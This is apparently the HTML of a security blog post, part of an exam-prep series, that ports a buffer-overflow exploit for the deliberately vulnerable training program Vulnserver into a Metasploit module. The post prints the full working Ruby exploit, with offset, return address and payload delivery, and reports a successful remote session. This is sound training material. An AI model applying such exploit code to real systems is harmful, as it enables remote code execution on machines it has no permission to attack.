@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="en">
+
+    <head><title>Vulnserver part 2: Porting to Metasploit &ndash; The Shellcoders Grimoire</title>
+<meta name="description" content="The eldritch tomb breathes as you unseal its ancient bindings, forgotten curses searing your mind as you ingest its forbidden knowledge.">
+
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta charset="UTF-8"/>
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.2/css/all.min.css" integrity="sha512-1sCRPdkRXhBV2PBLUdRb4tMg1w2YPf37qatUFeS7zlBy7jJI8Lf4VHwWfZZfpXtYSLy85pkm9GaYVYMfw5BC1A==" crossorigin="anonymous" />
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.1/css/academicons.min.css" integrity="sha512-b1ASx0WHgVFL5ZQhTgiPWX+68KjS38Jk87jg7pe+qC7q9YkEtFq0z7xCglv7qGIs/68d3mAp+StfC8WKC5SSAg==" crossorigin="anonymous" />
+
+
+<link rel="stylesheet" href="https://xormancer.github.io/css/palettes/dark.css">
+<link rel="stylesheet" href="https://xormancer.github.io/css/risotto.css">
+<link rel="stylesheet" href="https://xormancer.github.io/css/custom.css">
+
+
+<link rel="icon" href="https://xormancer.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="32x32" href="https://xormancer.github.io/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="https://xormancer.github.io/favicon-16x16.png">
+<link rel="apple-touch-icon" href="https://xormancer.github.io/apple-touch-icon.png">
+<link rel="manifest" href="https://xormancer.github.io/site.webmanifest">
+</head>
+
+    <body>
+        <div class="page">
+
+            <header class="page__header"><nav class="page__nav main-nav">
+    <ul>
+    <h1 class="page__logo"><a href="https://xormancer.github.io/" class="page__logo-inner">The Shellcoders Grimoire</a></h1>
+    
+    
+    <li class="main-nav__item"><a class="nav-main-item" href="https://xormancer.github.io/posts/" title="">Posts</a></li>
+    
+    <li class="main-nav__item"><a class="nav-main-item" href="https://xormancer.github.io/series/" title="">Series</a></li>
+    
+    <li class="main-nav__item"><a class="nav-main-item" href="https://xormancer.github.io/whoami/" title="">Whoami</a></li>
+    
+    </ul>
+</nav>
+
+</header>
+
+            <section class="page__body">
+    <h1 id="vulnserver-part-2-porting-to-metasploit">Vulnserver part 2: Porting to Metasploit</h1>
+
+    <hr>
+<blockquote>
+<p>In a previous <a href="https://xormancer.github.io/posts/vulnserver1/">blogpost</a>, we exploited the TRUN command within <strong>Vulnserver</strong>. Lets port our POC to a Metasploit module!</p>
+</blockquote>
+<p><em>This post is a part of the <a href="/series/osed-prep/">OSED Prep</a> series!</em></p>
+<h2 id="setup">Setup</h2>
+<hr>
+<ol>
+<li><a href="https://github.com/stephenbradshaw/vulnserver">vulnserver</a></li>
+<li><a href="https://github.com/rapid7/metasploit-framework">metasploit</a></li>
+<li>A windows system to host the vulnserver executable, alongside a *nix system.</li>
+</ol>
+<blockquote>
+<p><em><a href="https://www.kali.org/">Kali linux</a> or anything with pentesting tools will work perfectly fine.</em></p>
+</blockquote>
+<h2 id="finding-a-starting-template">Finding a starting template</h2>
+<hr>
+<p>After reaching part 4 of <a href="https://www.corelan.be/index.php/2009/08/12/exploit-writing-tutorials-part-4-from-exploit-to-metasploit-the-basics/">corelans</a> exploit development series, I decided to try my luck at porting my vulnserver POC to Metasploit. While their example was great, a few google searches later landed me on a <a href="https://bowneconsultingcontent.com/pub/EH/proj/H311.htm">template</a> for vulnserver that was an excellent starting point.</p>
+<p>I then created a new exploit within metasploits default path, in which our starting template will be pasted.</p>
+<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mkdir -p /kali/.msf4/modules/exploits/windows/misc 
+</span></span><span style="display:flex;"><span>sudo vim /kali/.msf4/modules/exploits/windows/misc/vulnserver_bof.rb
+</span></span></code></pre></div><blockquote>
+<p>Ensure that you execute <code>reload_all</code> within msfconsole when adding or modifying modules. Additionally, <strong>DEP</strong> should be disabled!</p>
+</blockquote>
+<h2 id="testing-the-initial-template">Testing the initial template</h2>
+<hr>
+<p>Upon initial testing, the module was able to create a payload and establish a metasploit session. This initially confused me, as the payload value within my POC was slightly larger in comparison to the authors. despite targeting the same RET address.</p>
+<p>This ended up being a result of the &lsquo;TRUN&rsquo; command containng 2 extra characters as a result of their fuzzers discovered prefix. This deviation explains the <strong>2003</strong> vs <strong>2005</strong> offset length for the payload.</p>
+<p>Below is my final code with modifications to match the exploit created during my previous blog post.</p>
+<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#928374;font-style:italic"># Metasploit template modified from corelan.be</span>
+</span></span><span style="display:flex;"><span><span style="color:#928374;font-style:italic"># BoF for vunserver thegreycorner.com</span>
+</span></span><span style="display:flex;"><span><span style="color:#928374;font-style:italic"># https://github.com/stephenbradshaw/vulnserver</span>
+</span></span><span style="display:flex;"><span><span style="color:#928374;font-style:italic"># Everett Platt</span>
+</span></span><span style="display:flex;"><span><span style="color:#fabd2f">require</span> <span style="color:#b8bb26">&#39;msf/core&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#fe8019">class</span> MetasploitModule <span style="color:#fe8019">&lt;</span> <span style="color:#d3869b">Msf</span><span style="color:#fe8019">::</span><span style="color:#d3869b">Exploit</span><span style="color:#fe8019">::</span><span style="color:#d3869b">Remote</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#fe8019">include</span> <span style="color:#d3869b">Msf</span><span style="color:#fe8019">::</span><span style="color:#d3869b">Exploit</span><span style="color:#fe8019">::</span><span style="color:#d3869b">Remote</span><span style="color:#fe8019">::</span><span style="color:#d3869b">Tcp</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#fe8019">def</span> <span style="color:#fabd2f">initialize</span>(info <span style="color:#fe8019">=</span> {})
+</span></span><span style="display:flex;"><span><span style="color:#fe8019">super</span>(update_info(info,
+</span></span><span style="display:flex;"><span><span style="color:#b8bb26">&#39;Name&#39;</span> <span style="color:#fe8019">=&gt;</span> <span style="color:#b8bb26">&#39;Vulnserver stack overflow (NO DEP)&#39;</span>,
+</span></span><span style="display:flex;"><span><span style="color:#b8bb26">&#39;Description&#39;</span> <span style="color:#fe8019">=&gt;</span> <span style="color:#b8bb26">%q{
+</span></span></span><span style="display:flex;"><span><span style="color:#b8bb26">This module exploits a stack overflow in the
+</span></span></span><span style="display:flex;"><span><span style="color:#b8bb26">vulnserver application.
+</span></span></span><span style="display:flex;"><span><span style="color:#b8bb26">}</span>,
+</span></span><span style="display:flex;"><span><span style="color:#b8bb26">&#39;Author&#39;</span> <span style="color:#fe8019">=&gt;</span> <span style="color:#fe8019">[</span> <span style="color:#b8bb26">&#39;Everett Platt&#39;</span><span style="color:#fe8019">]</span>,
+</span></span><span style="display:flex;"><span><span style="color:#b8bb26">&#39;Version&#39;</span> <span style="color:#fe8019">=&gt;</span> <span style="color:#b8bb26">&#39;$Revision: 1 $&#39;</span>,
+</span></span><span style="display:flex;"><span><span style="color:#b8bb26">&#39;References&#39;</span> <span style="color:#fe8019">=&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#fe8019">[</span>
+</span></span><span style="display:flex;"><span><span style="color:#fe8019">[</span> <span style="color:#b8bb26">&#39;Vunserver&#39;</span>, <span style="color:#b8bb26">&#39;http://www.thegreycorner.com/p/vulnserver.html&#39;</span> <span style="color:#fe8019">]</span>,
+</span></span><span style="display:flex;"><span><span style="color:#fe8019">[</span> <span style="color:#b8bb26">&#39;corelan.be&#39;</span>, <span style="color:#b8bb26">&#39;http://tinyurl.com/64s3je4&#39;</span> <span style="color:#fe8019">]</span>,
+</span></span><span style="display:flex;"><span><span style="color:#fe8019">[</span> <span style="color:#b8bb26">&#39;xormancer.github.io&#39;</span>, <span style="color:#b8bb26">&#39;https://xormancer.github.io/posts/vulnserver1/&#39;</span> <span style="color:#fe8019">]</span>,
+</span></span><span style="display:flex;"><span><span style="color:#fe8019">]</span>,
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#b8bb26">&#39;DefaultOptions&#39;</span> <span style="color:#fe8019">=&gt;</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span><span style="color:#b8bb26">&#39;EXITFUNC&#39;</span> <span style="color:#fe8019">=&gt;</span> <span style="color:#b8bb26">&#39;process&#39;</span>,
+</span></span><span style="display:flex;"><span>},
+</span></span><span style="display:flex;"><span><span style="color:#b8bb26">&#39;Payload&#39;</span> <span style="color:#fe8019">=&gt;</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span><span style="color:#b8bb26">&#39;Space&#39;</span> <span style="color:#fe8019">=&gt;</span> <span style="color:#d3869b">500</span>,
+</span></span><span style="display:flex;"><span><span style="color:#b8bb26">&#39;BadChars&#39;</span> <span style="color:#fe8019">=&gt;</span> <span style="color:#b8bb26">&#34;</span><span style="color:#b8bb26">\x00</span><span style="color:#b8bb26">&#34;</span>,
+</span></span><span style="display:flex;"><span>},
+</span></span><span style="display:flex;"><span><span style="color:#b8bb26">&#39;Platform&#39;</span> <span style="color:#fe8019">=&gt;</span> <span style="color:#b8bb26">&#39;win&#39;</span>,
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#b8bb26">&#39;Targets&#39;</span> <span style="color:#fe8019">=&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#fe8019">[</span>
+</span></span><span style="display:flex;"><span><span style="color:#fe8019">[</span><span style="color:#b8bb26">&#39;Windows XP Universal&#39;</span>,
+</span></span><span style="display:flex;"><span>{ <span style="color:#b8bb26">&#39;Ret&#39;</span> <span style="color:#fe8019">=&gt;</span> <span style="color:#d3869b">0x625011af</span>, <span style="color:#b8bb26">&#39;Offset&#39;</span> <span style="color:#fe8019">=&gt;</span> <span style="color:#d3869b">2005</span> } <span style="color:#fe8019">]</span>,
+</span></span><span style="display:flex;"><span><span style="color:#fe8019">]</span>,
+</span></span><span style="display:flex;"><span><span style="color:#b8bb26">&#39;DefaultTarget&#39;</span> <span style="color:#fe8019">=&gt;</span> <span style="color:#d3869b">0</span>,
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#b8bb26">&#39;Privileged&#39;</span> <span style="color:#fe8019">=&gt;</span> <span style="color:#fe8019">false</span>
+</span></span><span style="display:flex;"><span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>register_options(
+</span></span><span style="display:flex;"><span><span style="color:#fe8019">[</span>
+</span></span><span style="display:flex;"><span><span style="color:#d3869b">Opt</span><span style="color:#fe8019">::</span><span style="color:#d3869b">RPORT</span>(<span style="color:#d3869b">9999</span>)
+</span></span><span style="display:flex;"><span><span style="color:#fe8019">]</span>, <span style="color:#fabd2f">self</span><span style="color:#fe8019">.</span>class)
+</span></span><span style="display:flex;"><span><span style="color:#fe8019">end</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#fe8019">def</span> <span style="color:#fabd2f">exploit</span>
+</span></span><span style="display:flex;"><span>connect
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>junk <span style="color:#fe8019">=</span> make_nops(target<span style="color:#fe8019">[</span><span style="color:#b8bb26">&#39;Offset&#39;</span><span style="color:#fe8019">]</span>)
+</span></span><span style="display:flex;"><span>sploit <span style="color:#fe8019">=</span> <span style="color:#b8bb26">&#39;TRUN /.&#39;</span> <span style="color:#fe8019">+</span> junk <span style="color:#fe8019">+</span> <span style="color:#fe8019">[</span>target<span style="color:#fe8019">.</span>ret<span style="color:#fe8019">].</span>pack(<span style="color:#b8bb26">&#39;V&#39;</span>) <span style="color:#fe8019">+</span> make_nops(<span style="color:#d3869b">32</span>) <span style="color:#fe8019">+</span> payload<span style="color:#fe8019">.</span>encoded
+</span></span><span style="display:flex;"><span>sock<span style="color:#fe8019">.</span>put(sploit)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>handler
+</span></span><span style="display:flex;"><span>disconnect
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#fe8019">end</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#fe8019">end</span>
+</span></span></code></pre></div><h2 id="testing-our-new-module">Testing our new module</h2>
+<hr>
+<p>After providing the correct arguments, our module was able to successfully establish a metasploit session.</p>
+<p><img src="kali.png" alt="Kali"></p>
+<p>On windows we can notice our client connection, which successfully delivered our malicious payload.</p>
+<p><img src="windows.png" alt="Kali"></p>
+<h2 id="references">References</h2>
+<hr>
+<p><a href="https://www.corelan.be/index.php/2009/08/12/exploit-writing-tutorials-part-4-from-exploit-to-metasploit-the-basics/">https://www.corelan.be/index.php/2009/08/12/exploit-writing-tutorials-part-4-from-exploit-to-metasploit-the-basics/</a></p>
+<p><a href="https://bowneconsultingcontent.com/pub/EH/proj/H311.htm">https://bowneconsultingcontent.com/pub/EH/proj/H311.htm</a></p>
+<p><a href="https://xormancer.github.io/posts/vulnserver1/">https://xormancer.github.io/posts/vulnserver1/</a></p>
+
+
+    <ul>
+    
+    </ul>
+
+
+            </section>
+
+            <section class="page__aside">
+                <div class="aside__about">
+<div class="aside__about">
+    
+<h1 class="about__title">XORMANCER</h1>
+<p class="about__description">The eldritch tomb breathes as you unseal its ancient bindings, forgotten curses searing your mind as you ingest its forbidden knowledge.</p>
+</div>
+
+
+<ul class="aside__social-links">
+    
+    <li>
+        <a href="https://github.com/XORMANCER" rel="me" aria-label="GitHub" title="GitHub"><i class="fa-brands fa-github" aria-hidden="true"></i></a>&nbsp;
+    </li>
+    
+    <li>
+        <a href="https://twitter.com/XORMANCER" rel="me" aria-label="Twitter" title="Twitter"><i class="fa-brands fa-twitter" aria-hidden="true"></i></a>&nbsp;
+    </li>
+    
+    <li>
+        <a href="https://www.linkedin.com/in/ev-platt-iii/" rel="me" aria-label="Linkden" title="Linkden"><i class="fa-brands fa-linkedin" aria-hidden="true"></i></a>&nbsp;
+    </li>
+    
+</ul>
+</div>
+                <hr>
+                <div class="aside__content">
+    
+
+                </div>
+            </section>
+
+            <footer class="page__footer"><p>
+    
+    
+    
+    
+    
+    
+      
+    
+      
+    
+      
+    
+    
+    
+</p>
+<br /><br />
+<p class="copyright">© <a href="https://xormancer.github.io/">XORMANCER</a> (Everett Platt)</p>
+<p class="advertisement">Powered by <a href="https://gohugo.io/">hugo</a> and <a href="https://github.com/joeroe/risotto">risotto</a>.</p>
+</footer>
+
+        </div>
+    </body>
+
+</html>
